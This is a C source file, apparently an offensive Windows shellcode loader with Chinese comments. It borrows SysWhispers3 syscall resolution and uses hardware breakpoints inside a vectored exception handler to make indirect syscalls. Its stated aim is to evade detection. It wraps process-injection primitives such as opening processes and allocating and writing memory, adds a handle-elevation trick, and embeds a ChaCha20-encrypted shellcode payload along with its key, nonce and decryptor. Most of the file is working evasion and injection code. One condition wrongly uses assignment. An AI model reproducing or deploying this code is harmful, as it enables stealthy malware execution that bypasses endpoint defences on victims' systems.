#include <stdio.h>
#include <stdint.h>
#include "syscalls.h"
#include <phnt_windows.h>
#include <phnt.h>
#include <stdbool.h>
//#define DEBUG

typedef struct _SFParams {
	DWORD ParamNum;
	BOOL IsLegacy;
	DWORD FuncHash;
	DWORD_PTR param[17];
} SFParams, * PSFParams;

DWORD* NullPointer = NULL;
SFParams Params = { 0 }; // 用于向VEH传递真实的函数调用参数

/*========================================
以下代码属于GitHub项目 SysWhisper3 的部分引用
https://github.com/klezVirus/SysWhispers3
========================================*/
DWORD SW3_HashSyscall(PCSTR FunctionName)
{
	DWORD i = 0;
	DWORD Hash = SW3_SEED;

	while (FunctionName[i])
	{
		WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
		Hash ^= PartialName + SW3_ROR8(Hash);
	}

	return Hash;
}

PVOID SC_Address(PVOID NtApiAddress)
{
	DWORD searchLimit = 512;
	PVOID SyscallAddress;
	BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
	ULONG distance_to_syscall = 0x12;
	SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall);
	if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
	{
		return SyscallAddress;
	}
	for (ULONG32 num_jumps = 1; num_jumps < searchLimit; num_jumps++)
	{
		SyscallAddress = SW3_RVA2VA(
			PVOID,
			NtApiAddress,
			distance_to_syscall + num_jumps * 0x20);
		if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
		{
			return SyscallAddress;
		}
		SyscallAddress = SW3_RVA2VA(
			PVOID,
			NtApiAddress,
			distance_to_syscall - num_jumps * 0x20);
		if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
		{
			return SyscallAddress;
		}
	}
	return NULL;
}

static PVOID GetNtdllBase()
{
	PSW3_PEB Peb = (PSW3_PEB)__readgsqword(0x60);
	PSW3_PEB_LDR_DATA Ldr = Peb->Ldr;
	PSW3_LDR_DATA_TABLE_ENTRY LdrEntry;
	for (LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
	{
		PVOID DllBase = LdrEntry->DllBase;
		PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
		PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
		PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
		DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		if (VirtualAddress == 0) continue;
		PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);
		PCHAR DllName = SW3_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);
		if ((*(ULONG*)DllName | 0x20202020) != 0x6c64746e) continue;
		if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c)
			return DllBase;
	}
	return NULL;
}

PVOID SW3_GetSyscallAddress(DWORD FunctionHash)
{
	PVOID DllBase = GetNtdllBase();
	if (!DllBase) return NULL;

	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
	PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
	PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
	DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (VirtualAddress == 0) return NULL;

	PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);
	DWORD NumberOfNames = ExportDirectory->NumberOfNames;
	PDWORD Functions = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
	PDWORD Names = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
	PWORD Ordinals = SW3_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

	for (DWORD i = 0; i < NumberOfNames; i++)
	{
		PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[i]);
		if (*(USHORT*)FunctionName == 0x775a) // Check for "Zw"
		{
			DWORD CurrentHash = SW3_HashSyscall(FunctionName);
			if (CurrentHash == FunctionHash)
			{
				PVOID NtApiAddress = SW3_RVA2VA(PVOID, DllBase, Functions[Ordinals[i]]);
				return SC_Address(NtApiAddress);
			}
		}
	}
	return NULL;
}

DWORD SW3_GetSyscallNumber(DWORD FunctionHash)
{
	PVOID DllBase = GetNtdllBase();
	if (!DllBase) return -1;

	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
	PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
	PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
	DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (VirtualAddress == 0) return -1;

	PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);
	DWORD NumberOfNames = ExportDirectory->NumberOfNames;
	PDWORD Functions = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
	PDWORD Names = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
	PWORD Ordinals = SW3_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

	// 收集所有 Zw* 函数的地址并按地址排序以推导系统调用号
	typedef struct {
		DWORD Address;
		DWORD Hash;
	} SyscallEntry;
	SyscallEntry TempEntries[600]; // 临时数组，假设最多 600 个 Zw* 函数
	DWORD Count = 0;

	for (DWORD i = 0; i < NumberOfNames; i++)
	{
		PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[i]);
		if (*(USHORT*)FunctionName == 0x775a) // Check for "Zw"
		{
			TempEntries[Count].Hash = SW3_HashSyscall(FunctionName);
			TempEntries[Count].Address = Functions[Ordinals[i]];
			Count++;
			if (Count >= 600) break;
		}
	}

	// 按地址排序
	for (DWORD i = 0; i < Count - 1; i++)
	{
		for (DWORD j = 0; j < Count - i - 1; j++)
		{
			if (TempEntries[j].Address > TempEntries[j + 1].Address)
			{
				SyscallEntry Temp = TempEntries[j];
				TempEntries[j] = TempEntries[j + 1];
				TempEntries[j + 1] = Temp;
			}
		}
	}

	// 查找匹配的哈希并返回索引作为系统调用号
	for (DWORD i = 0; i < Count; i++)
	{
		if (TempEntries[i].Hash == FunctionHash)
		{
			return i;
		}
	}
	return -1;
}
/*========================================
以上代码属于GitHub项目 SysWhisper3 的部分引用
https://github.com/klezVirus/SysWhispers3
========================================*/

LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo) {
	if (pExceptInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
		if (Params.IsLegacy == 1) {
			pExceptInfo->ContextRecord->Dr0 = (DWORD_PTR)SW3_GetSyscallAddress(0x022B80BFE);
		}
		else {
			pExceptInfo->ContextRecord->Dr0 = (DWORD_PTR)SW3_GetSyscallAddress(Params.FuncHash);
		}
		pExceptInfo->ContextRecord->Dr7 = 0x00000303;
		pExceptInfo->ContextRecord->Rip = pExceptInfo->ContextRecord->Rip + 6;
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	else { // 默认其他异常都是单步异常
		pExceptInfo->ContextRecord->Rcx = Params.param[1];
		pExceptInfo->ContextRecord->Rdx = Params.param[2];
		pExceptInfo->ContextRecord->R8 = Params.param[3];
		pExceptInfo->ContextRecord->R9 = Params.param[4];
		pExceptInfo->ContextRecord->R10 = Params.param[1];
		if (Params.ParamNum > 4) {
			int extra_para = Params.ParamNum - 4;
			DWORD64* stack = (DWORD64*)(pExceptInfo->ContextRecord->Rsp + 40); // 偏移40字节 保留影子空间
			for (int i = 5; i <= Params.ParamNum; ++i) {
				stack[i - 5] = (DWORD64)(Params.param[i]); // 通过堆栈传递剩余参数
			}
		}
		if (Params.IsLegacy = 1) {
			pExceptInfo->ContextRecord->Rax = SW3_GetSyscallNumber(Params.FuncHash);
			pExceptInfo->ContextRecord->Rip = SW3_GetSyscallAddress(Params.FuncHash);
		}
		pExceptInfo->ContextRecord->Dr0 = 0;
		pExceptInfo->ContextRecord->Dr7 = 0; // 清除调试寄存器 防止内核态对硬件断点的检测
		memset(&Params, 0, sizeof(Params));
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

NTSTATUS SFNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)RegionSize; Params.param[4] = (DWORD_PTR)NewProtect; Params.param[5] = (DWORD_PTR)OldProtect; Params.ParamNum = 5; Params.FuncHash = 0x097129F93; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\sf.log"); return 0; }
NTSTATUS SFNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)Buffer; Params.param[4] = (DWORD_PTR)NumberOfBytesToWrite; Params.param[5] = (DWORD_PTR)NumberOfBytesWritten; Params.ParamNum = 5; Params.FuncHash = 0x007901F0F; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\sf.log"); return 0; }
NTSTATUS SFNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)Buffer; Params.param[4] = (DWORD_PTR)BufferSize; Params.param[5] = (DWORD_PTR)NumberOfBytesRead; Params.ParamNum = 5; Params.FuncHash = 0x01D950B1B; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\sf.log"); return 0; }
NTSTATUS SFNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)DesiredAccess; Params.param[3] = (DWORD_PTR)ObjectAttributes; Params.param[4] = (DWORD_PTR)ClientId; Params.ParamNum = 4; Params.FuncHash = 0x0FEA4D138; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\sf.log"); return 0; }
NTSTATUS SFNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)ZeroBits; Params.param[4] = (DWORD_PTR)RegionSize; Params.param[5] = (DWORD_PTR)AllocationType; Params.param[6] = (DWORD_PTR)Protect; Params.ParamNum = 6; Params.FuncHash = 0x00114EF73; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\sf.log"); return 0; }
NTSTATUS SFNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)ProcessInformationClass; Params.param[3] = (DWORD_PTR)ProcessInformation; Params.param[4] = (DWORD_PTR)ProcessInformationLength; Params.param[5] = (DWORD_PTR)ReturnLength; Params.ParamNum = 5; Params.FuncHash = 0x0DD27CE88; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\sf.log"); return 0; }
NTSTATUS SFNtDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options) { Params.param[1] = (DWORD_PTR)SourceProcessHandle; Params.param[2] = (DWORD_PTR)SourceHandle; Params.param[3] = (DWORD_PTR)TargetProcessHandle; Params.param[4] = (DWORD_PTR)TargetHandle; Params.param[5] = (DWORD_PTR)DesiredAccess; Params.param[6] = (DWORD_PTR)HandleAttributes; Params.param[7] = (DWORD_PTR)Options; Params.ParamNum = 7; Params.FuncHash = 0x0ECBFE423; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\sf.log"); return 0; }
NTSTATUS SFNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) { Params.param[1] = (DWORD_PTR)SystemInformationClass; Params.param[2] = (DWORD_PTR)SystemInformation; Params.param[3] = (DWORD_PTR)SystemInformationLength; Params.param[4] = (DWORD_PTR)ReturnLength; Params.ParamNum = 4; Params.FuncHash = 0x09E349EA7; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\sf.log"); return 0; }

DWORD ConvertProcNameToPid(wchar_t* ProcName) { // 根据进程名获取进程ID
	ULONG bufferSize = 1024 * 1024;
	PVOID buffer = malloc(bufferSize);
	ULONG returnLength = 0;
	SFNtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &returnLength);
	PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
	while (TRUE) {
		if (pInfo->ImageName.Buffer && wcsstr(pInfo->ImageName.Buffer, ProcName)) {
			DWORD pid = (DWORD)pInfo->UniqueProcessId;
			free(buffer);
			return pid;
		}
		if (pInfo->NextEntryOffset == 0) {
			break;
		}
		pInfo = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pInfo + pInfo->NextEntryOffset);
	}
	free(buffer);
	return 0;
}

// 感谢CodeWhiteSec对句柄提权的研究 代码改编自https://github.com/codewhitesec/SysmonEnte/
HANDLE ElevateHandle(IN HANDLE hProcess, IN ACCESS_MASK DesiredAccess, IN DWORD HandleAttributes) { // 句柄提升漏洞
	HANDLE hDupPriv = NULL;
	HANDLE hHighPriv = NULL;
	ULONG options = 0;
	#ifdef DEBUG
	printf("[*] 利用句柄提升漏洞... 进度(1/2)\n");
	#endif
	SFNtDuplicateObject((HANDLE)(LONG_PTR)-1, hProcess, (HANDLE)(LONG_PTR)-1, &hDupPriv, PROCESS_DUP_HANDLE, FALSE, 0);
	#ifdef DEBUG
	printf("[*] 利用句柄提升漏洞... 进度(2/2)\n");
	#endif
	SFNtDuplicateObject(hDupPriv, (HANDLE)(LONG_PTR)-1, (HANDLE)(LONG_PTR)-1, &hHighPriv, DesiredAccess, HandleAttributes, options);
	return hHighPriv;
}

unsigned char encrypted_shellcode[] = {
	0x76, 0xA1, 0xD7, 0x3A, 0xCE, 0x3E, 0x59, 0x33, 0xB1, 0x46, 0xD9, 0xDC, 0x37, 0x11, 0xB9, 0x96, 0x80, 0x6A, 0xBE, 0xB5, 0x93, 0x34, 0x31, 0xA2, 0x5A, 0xBB, 0x41, 0x7B, 0x0D, 0x68, 0x85, 0xD1, 0x0C, 0x28, 0x20, 0x10, 0xF5, 0xFA, 0x13, 0xCA, 0xF1, 0x2D, 0xAD, 0x32, 0x63, 0x8E, 0x45, 0x08, 0x61, 0xEB, 0xE0, 0xC6, 0xFB, 0x11, 0x59, 0x52, 0x58, 0xB9, 0x29, 0x66, 0xD9, 0x6F, 0x91, 0x0E, 0x5B, 0xE8, 0x52, 0xEB, 0x15, 0x68, 0xCA, 0xDE, 0xD5, 0xF1, 0xB6, 0x07, 0xBB, 0x0B, 0x0F, 0xBF, 0x65, 0x7F, 0x25, 0x7F, 0x02, 0x61, 0xBC, 0x47, 0xD4, 0x4E, 0x27, 0xAB, 0x5B, 0xB6, 0x87, 0x01, 0x26, 0x6E, 0x2F, 0x11, 0x10, 0x2E, 0xA3, 0xDD, 0xD6, 0xDA, 0xA3, 0x96, 0xCD, 0x17, 0xD1, 0x07, 0x42, 0xDA, 0xAD, 0xDB, 0xEF, 0x91, 0x56, 0xCD, 0x79, 0x5E, 0x07, 0x57, 0xC5, 0xEE, 0xCA, 0xA2, 0x9A, 0x81, 0x4A, 0xBB, 0x10, 0xB8, 0xEE, 0x3B, 0xBC, 0x75, 0x97, 0xB1, 0x2E, 0x84, 0x0E, 0x22, 0xCA, 0xED, 0xD2, 0x6B, 0xB0, 0xE9, 0xAA, 0x2A, 0x90, 0xC8, 0xFB, 0x4D, 0x62, 0x62, 0xC6, 0xF4, 0xD3, 0xC0, 0x2C, 0x96, 0x48, 0x04, 0x6B, 0x65, 0xB0, 0xB4, 0x1D, 0xE5, 0x35, 0x6E, 0x93, 0x54, 0x71, 0x83, 0x5C, 0xCC, 0xF9, 0x87, 0xC3, 0xA6, 0x00, 0x6E, 0x53, 0x0C, 0x3A, 0x7A, 0x07, 0x3A, 0xA0, 0x7C, 0xCF, 0x45, 0x27, 0xE2, 0x0D, 0x79, 0x90, 0xD1, 0xE8, 0x48, 0x85, 0x29, 0x28, 0xEC, 0x7B, 0xF4, 0x4C, 0x22, 0x1F, 0xBE, 0x00, 0x3A, 0x16, 0xF2, 0xC7, 0x75, 0xFC, 0xC8, 0x40, 0x11, 0x96, 0x2F, 0xA9, 0x73, 0x2C, 0xFB, 0xE2, 0x7C, 0xD4, 0x12, 0xB1, 0xDC, 0x69, 0x92, 0x0D, 0x4A, 0x1F, 0x25, 0x65, 0xD9, 0x74, 0x38, 0x52, 0xC6, 0xAF, 0xE0, 0x12, 0x7F, 0xDB, 0xAB, 0xE5, 0x1C, 0xDD, 0xB8, 0x65, 0xB7, 0x84, 0xB6, 0x07, 0xF6, 0x88, 0xEC, 0x61, 0x64, 0xEF, 0x77, 0xB6, 0x6E, 0x70, 0xCD, 0x65, 0x7F, 0x2D, 0x99, 0x8D, 0xDF, 0x8B, 0xC5, 0x89, 0x09, 0xB8, 0x34, 0x7D, 0x2E, 0xD0, 0x12, 0xCF, 0x56, 0x2E, 0xD3, 0x0F, 0x6D, 0xCE, 0x70, 0xD4, 0x0D, 0x82, 0x2B, 0x5C, 0x7F, 0x82, 0xEF, 0x71, 0xDC, 0xFA, 0xEE, 0x24, 0x5F, 0x14, 0x8D, 0x4D, 0x5B, 0x69, 0x23, 0x69, 0xA3, 0xEB, 0x21, 0xE1, 0xC8, 0x05, 0x58, 0x11, 0x7E, 0xDE, 0x39, 0xF8, 0x3B, 0x19, 0x99, 0xF7, 0x33, 0xF5, 0xBB, 0x4D, 0x33, 0x0C, 0x27, 0x12, 0x05, 0x0C, 0x02, 0xB5, 0x29, 0x16, 0x57, 0x66, 0x19, 0x99, 0x21, 0x2A, 0x68, 0xC1, 0xE8, 0xA2, 0xEB, 0x7A, 0xE8, 0x14, 0xE9, 0x5F, 0xB9, 0xDF, 0x18, 0xFF, 0xA6, 0x45, 0x87, 0x19, 0x31, 0x22
};

// 密钥和 nonce：
unsigned char key[] = { 0x80, 0x23, 0x03, 0xB7, 0xE8, 0x9A, 0x57, 0x54, 0x51, 0x16, 0x79, 0x40, 0x79, 0x71, 0xD5, 0x7E, 0xB4, 0x37, 0x7A, 0x0B, 0xB2, 0x28, 0x8A, 0xE3, 0xB1, 0x26, 0x87, 0xBC, 0x30, 0x34, 0x38, 0xC5 };
unsigned char nonce[] = { 0x94, 0xF2, 0x98, 0xF8, 0xB2, 0x72, 0xD4, 0x88, 0xA6, 0x2D, 0xA1, 0x1F, 0x0D, 0x7E, 0x06, 0xCE };

// 左旋转宏
#define ROTL32(x, n) (((x) << (n)) | ((x) >> (32 - (n))))
// 对齐宏（向上取整到对齐边界）
#define ALIGN_UP(x, a) (((x) + ((a) - 1)) & ~((a) - 1))
// 对齐宏（向上取整到对齐边界）
#define ALIGN_UP(x, a) (((x) + ((a) - 1)) & ~((a) - 1))

// ChaCha20轮函数
void chacha20_quarter_round(uint32_t* a, uint32_t* b, uint32_t* c, uint32_t* d) {
	*a += *b; *d = ROTL32(*d ^ *a, 16);
	*c += *d; *b = ROTL32(*b ^ *c, 12);
	*a += *b; *d = ROTL32(*d ^ *a, 8);
	*c += *d; *b = ROTL32(*b ^ *c, 7);
}

// ChaCha20块函数
void chacha20_block(uint32_t* state, uint8_t* keystream) {
	uint32_t x[16];
	memcpy(x, state, 16 * sizeof(uint32_t));
	for (int i = 0; i < 10; i++) {
		chacha20_quarter_round(&x[0], &x[4], &x[8], &x[12]);
		chacha20_quarter_round(&x[1], &x[5], &x[9], &x[13]);
		chacha20_quarter_round(&x[2], &x[6], &x[10], &x[14]);
		chacha20_quarter_round(&x[3], &x[7], &x[11], &x[15]);
		chacha20_quarter_round(&x[0], &x[5], &x[10], &x[15]);
		chacha20_quarter_round(&x[1], &x[6], &x[11], &x[12]);
		chacha20_quarter_round(&x[2], &x[7], &x[8], &x[13]);
		chacha20_quarter_round(&x[3], &x[4], &x[9], &x[14]);
	}
	for (int i = 0; i < 16; i++) {
		x[i] += state[i];
	}
	for (int i = 0; i < 16; i++) {
		keystream[i * 4 + 0] = (x[i] >> 0) & 0xFF;
		keystream[i * 4 + 1] = (x[i] >> 8) & 0xFF;
		keystream[i * 4 + 2] = (x[i] >> 16) & 0xFF;
		keystream[i * 4 + 3] = (x[i] >> 24) & 0xFF;
	}
}

// ChaCha20解密
void chacha20_decrypt(const unsigned char* encrypted, size_t len,
	const unsigned char* key, const unsigned char* nonce,
	unsigned char* decrypted) {
	// Initialize ChaCha20 state
	uint32_t state[16];

	// Constants
	state[0] = 0x61707865; // "expa"
	state[1] = 0x3320646e; // "nd 3"
	state[2] = 0x79622d32; // "2-by"
	state[3] = 0x6b206574; // "te k"

	// Key (32 bytes)
	for (int i = 0; i < 8; i++) {
		state[4 + i] = ((uint32_t)key[4 * i]) |
			((uint32_t)key[4 * i + 1] << 8) |
			((uint32_t)key[4 * i + 2] << 16) |
			((uint32_t)key[4 * i + 3] << 24);
	}

	// Nonce (nonce[4:16] -> state[13-15])
	state[13] = ((uint32_t)nonce[4]) | ((uint32_t)nonce[5] << 8) |
		((uint32_t)nonce[6]) << 16 | ((uint32_t)nonce[7] << 24);
	state[14] = ((uint32_t)nonce[8]) | ((uint32_t)nonce[9] << 8) |
		((uint32_t)nonce[10]) << 16 | ((uint32_t)nonce[11] << 24);
	state[15] = ((uint32_t)nonce[12]) | ((uint32_t)nonce[13] << 8) |
		((uint32_t)nonce[14]) << 16 | ((uint32_t)nonce[15] << 24);

	// Initial counter (nonce[0:4])
	uint32_t initial_counter = ((uint32_t)nonce[0]) | ((uint32_t)nonce[1] << 8) |
		((uint32_t)nonce[2] << 16) | ((uint32_t)nonce[3] << 24);

	uint8_t keystream[64];
	size_t num_blocks = (len + 63) / 64; // Number of 64-byte blocks

	for (size_t block = 0; block < num_blocks; block++) {
		state[12] = initial_counter + block; // Counter increments per block
		chacha20_block(state, keystream);

		size_t start = block * 64;
		size_t end = (start + 64 < len) ? start + 64 : len;
		for (size_t i = start; i < end; i++) {
			decrypted[i] = encrypted[i] ^ keystream[i - start];
		}
	}
}

// ChaCha20解密封装
unsigned char* shellcode_decrypt(unsigned char* encrypted, size_t len) {
	unsigned char* decrypted = (unsigned char*)malloc(len);
	chacha20_decrypt(encrypted, len, key, nonce, decrypted);
	//for (size_t i = 0; i < len; i++) { // 输出解密后结果
	//    printf("0x%02X ", decrypted[i]);
	//    if ((i + 1) % 12 == 0) printf("\n");
	//}
	//printf("\n");
	return decrypted;
}

BOOL GetNtdllSectionVa(char* sectionName, PVOID* sectionVa, DWORD* sectionSize);
PVOID findLdrpVectorHandlerList(PVOID VEH);
LPVOID EnableRemoteVEH(HANDLE hProcess);

#define InitializeObjectAttributes(p, n, a, r, s) \
{ \
	(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
	(p)->RootDirectory = r; \
	(p)->Attributes = a; \
	(p)->ObjectName = n; \
	(p)->SecurityDescriptor = s; \
	(p)->SecurityQualityOfService = NULL; \
}

typedef struct _PEB2 // 我也不知道为什么要创建一个PEB2(PEB的前几十个成员) 而不用PEB结构体
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BYTE BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN IsPackagedProcess : 1;
			BOOLEAN IsAppContainer : 1;
			BOOLEAN IsProtectedProcessLight : 1;
			BOOLEAN IsLongPathAwareProcess : 1;
		} s1;
	} u1;

	HANDLE Mutant;

	PVOID ImageBaseAddress;
	PLDR_DATA_TABLE_ENTRY Ldr;
	void* ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PRTL_CRITICAL_SECTION FastPebLock;
	PVOID AtlThunkSListPtr;
	PVOID IFEOKey;
	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob : 1;
			ULONG ProcessInitializing : 1;
			ULONG ProcessUsingVEH : 1;
			ULONG ProcessUsingVCH : 1;
			ULONG ProcessUsingFTH : 1;
			ULONG ProcessPreviouslyThrottled : 1;
			ULONG ProcessCurrentlyThrottled : 1;
			ULONG ReservedBits0 : 25;
		} s2;
	} u2;
	union
	{
		PVOID KernelCallbackTable;
		PVOID UserSharedInfoPtr;
	} u3;
	ULONG SystemReserved[1];
	ULONG AtlThunkSListPtr32;
	PVOID ApiSetMap;
	ULONG TlsExpansionCounter;
	PVOID TlsBitmap;
	ULONG TlsBitmapBits[2];

	PVOID ReadOnlySharedMemoryBase;
	PVOID SharedData; // HotpatchInformation
	PVOID* ReadOnlyStaticServerData;

	PVOID AnsiCodePageData; // PCPTABLEINFO
	PVOID OemCodePageData; // PCPTABLEINFO
	PVOID UnicodeCaseTableData; // PNLSTABLEINFO

	ULONG NumberOfProcessors;
	ULONG NtGlobalFlag;

	LARGE_INTEGER CriticalSectionTimeout;
	SIZE_T HeapSegmentReserve;
	SIZE_T HeapSegmentCommit;
	SIZE_T HeapDeCommitTotalFreeThreshold;
	SIZE_T HeapDeCommitFreeBlockThreshold;

	ULONG NumberOfHeaps;
	ULONG MaximumNumberOfHeaps;
	PVOID* ProcessHeaps; // PHEAP

	PVOID GdiSharedHandleTable;
	PVOID ProcessStarterHelper;
	ULONG GdiDCAttributeList;

	PRTL_CRITICAL_SECTION LoaderLock;

	ULONG OSMajorVersion;
	ULONG OSMinorVersion;
	USHORT OSBuildNumber;
	USHORT OSCSDVersion;
	ULONG OSPlatformId;
	ULONG ImageSubsystem;
	ULONG ImageSubsystemMajorVersion;
	ULONG ImageSubsystemMinorVersion;
	ULONG_PTR ActiveProcessAffinityMask;
	PVOID GdiHandleBuffer;
	PVOID PostProcessInitRoutine;

	PVOID TlsExpansionBitmap;
	ULONG TlsExpansionBitmapBits[32];

	ULONG SessionId;

	ULARGE_INTEGER AppCompatFlags;
	ULARGE_INTEGER AppCompatFlagsUser;
	PVOID pShimData;
	PVOID AppCompatInfo; // APPCOMPAT_EXE_DATA

	LPVOID CSDVersion;

	PVOID ActivationContextData; // ACTIVATION_CONTEXT_DATA
	PVOID ProcessAssemblyStorageMap; // ASSEMBLY_STORAGE_MAP
	PVOID SystemDefaultActivationContextData; // ACTIVATION_CONTEXT_DATA
	PVOID SystemAssemblyStorageMap; // ASSEMBLY_STORAGE_MAP

	SIZE_T MinimumStackCommit;

	PVOID* FlsCallback;
	LIST_ENTRY FlsListHead;
	PVOID FlsBitmap;
	ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (sizeof(ULONG) * 8)];
	ULONG FlsHighIndex;

	PVOID WerRegistrationData;
	PVOID WerShipAssertPtr;
	PVOID pUnused; // pContextData
	PVOID pImageHeaderHash;
	union
	{
		ULONG TracingFlags;
		struct
		{
			ULONG HeapTracingEnabled : 1;
			ULONG CritSecTracingEnabled : 1;
			ULONG LibLoaderTracingEnabled : 1;
			ULONG SpareTracingBits : 29;
		} s3;
	} u4;
	ULONGLONG CsrServerReadOnlySharedMemoryBase;
	PVOID TppWorkerpListLock;
	LIST_ENTRY TppWorkerpList;
	PVOID WaitOnAddressHashTable[128];
	PVOID TelemetryCoverageHeader; // REDSTONE3
	ULONG CloudFileFlags;
} PEB2, * PPEB2;

typedef struct _VECTXCPT_CALLOUT_ENTRY {
	LIST_ENTRY ListEntry;
	PVOID reserved;
	int test;
	PVECTORED_EXCEPTION_HANDLER VectoredHandler;
} VECTXCPT_CALLOUT_ENTRY, * PVECTXCPT_CALLOUT_ENTRY;


